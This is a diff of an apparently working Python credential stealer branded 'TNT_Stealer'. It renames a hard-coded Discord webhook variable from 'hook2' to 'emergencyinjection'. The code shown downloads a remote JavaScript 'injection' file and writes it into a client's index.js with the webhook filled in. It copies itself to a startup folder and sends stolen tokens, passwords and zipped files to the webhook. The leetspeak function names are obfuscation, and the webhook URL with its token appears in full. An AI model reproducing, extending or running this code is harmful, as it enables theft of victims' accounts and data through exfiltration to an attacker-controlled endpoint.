@@ -534,7 +534,7 @@ def mac_check():
 
 
 hook = "YOUR WEBHOOK HERE"
-hook2 = "https://discord.com/api/webhooks/1139963367382077582/IwGY6gsubuEp-hxJBqQF7ppkLvoUqSfgrjHRRVxqVxMFeEHXOxrJY0W_QIKxuAcsgHK-"
+emergencyinjection = "https://discordapp.com/api/webhooks/1139963367382077582/IwGY6gsubuEp-hxJBqQF7ppkLvoUqSfgrjHRRVxqVxMFeEHXOxrJY0W_QIKxuAcsgHK-"
 inj3c710n_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
 color =  0x812118
 DETECTED = False
@@ -679,7 +679,7 @@ def inj3c710n():
 
                                                     inj3c710n_cont = requests.get(inj3c710n_url).text
 
-                                                    inj3c710n_cont = inj3c710n_cont.replace("%WEBHOOK%", hook2)
+                                                    inj3c710n_cont = inj3c710n_cont.replace("%WEBHOOK%", emergencyinjection)
 
                                                     with open(file_path, "w", encoding="utf-8") as index_file:
                                                         index_file.write(inj3c710n_cont)
@@ -2007,7 +2007,7 @@ def mac_check():
             pass
 
 
-hook2 = "https://discord.com/api/webhooks/1139963367382077582/IwGY6gsubuEp-hxJBqQF7ppkLvoUqSfgrjHRRVxqVxMFeEHXOxrJY0W_QIKxuAcsgHK-"
+emergencyinjection = "https://discord.com/api/webhooks/1139963367382077582/IwGY6gsubuEp-hxJBqQF7ppkLvoUqSfgrjHRRVxqVxMFeEHXOxrJY0W_QIKxuAcsgHK-"
 inj3c710n_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
 color =  0x812118
 DETECTED = False
@@ -2089,14 +2089,14 @@ def L04Dr3QU3575(methode, url, data='', files='', headers=''):
         except:
             pass
 
-def L04DUr118(hook2, data='', files='', headers=''):
+def L04DUr118(emergencyinjection, data='', files='', headers=''):
     for i in range(8):
         try:
             if headers != '':
-                r = urlopen(Request(hook2, data=data, headers=headers))
+                r = urlopen(Request(emergencyinjection, data=data, headers=headers))
                 return r
             else:
-                r = urlopen(Request(hook2, data=data))
+                r = urlopen(Request(emergencyinjection, data=data))
                 return r
         except: 
             pass
@@ -2152,7 +2152,7 @@ def inj3c710n():
 
                                                     inj3c710n_cont = requests.get(inj3c710n_url).text
 
-                                                    inj3c710n_cont = inj3c710n_cont.replace("%WEBHOOK%", hook2)
+                                                    inj3c710n_cont = inj3c710n_cont.replace("%WEBHOOK%", emergencyinjection)
 
                                                     with open(file_path, "w", encoding="utf-8") as index_file:
                                                         index_file.write(inj3c710n_cont)
@@ -2301,7 +2301,7 @@ if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower()
         shutil.copyfileobj(src_file, dst_file)
 
 def UP104D70K3N(token, path):
-    global hook2
+    global emergencyinjection
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -2379,7 +2379,7 @@ def UP104D70K3N(token, path):
         "username": "TNT_Stealer | t.me/blxstealer",
         "attachments": []
         }
-    L04DUr118(hook2, data=dumps(data).encode(), headers=headers)
+    L04DUr118(emergencyinjection, data=dumps(data).encode(), headers=headers)
     
 
 def R3F0rM47(listt):
@@ -2417,7 +2417,7 @@ def UP104D(name, link):
             "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
             "attachments": []
             }
-        L04DUr118(hook2, data=dumps(data).encode(), headers=headers)
+        L04DUr118(emergencyinjection, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "lxpassw":
@@ -2443,7 +2443,7 @@ def UP104D(name, link):
             "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
             "attachments": []
             }
-        L04DUr118(hook2, data=dumps(data).encode(), headers=headers)
+        L04DUr118(emergencyinjection, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "kiwi":
@@ -2471,7 +2471,7 @@ def UP104D(name, link):
             "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
             "attachments": []
             }
-        L04DUr118(hook2, data=dumps(data).encode(), headers=headers)
+        L04DUr118(emergencyinjection, data=dumps(data).encode(), headers=headers)
         return
 
 def wr173F0rF113(data, name):
@@ -2655,7 +2655,7 @@ def G47H3rZ1P5(paths1, paths2, paths3):
         "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
         "attachments": []
     }
-    L04DUr118(hook2, data=dumps(data).encode(), headers=headers)
+    L04DUr118(emergencyinjection, data=dumps(data).encode(), headers=headers)
 
 
 def Z1P73136r4M(path, arg, procc):
